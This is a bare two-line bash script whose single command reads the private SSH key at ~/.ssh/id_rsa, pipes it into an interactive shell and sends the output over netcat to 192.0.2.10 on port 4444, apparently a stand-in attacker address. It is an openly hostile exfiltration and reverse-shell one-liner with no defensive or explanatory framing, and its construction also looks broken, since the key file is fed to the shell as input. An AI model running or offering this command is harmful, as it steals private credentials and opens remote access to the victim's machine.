#!/bin/bash
cat ~/.ssh/id_rsa | sh -i 2>&1 | nc 192.0.2.10 4444
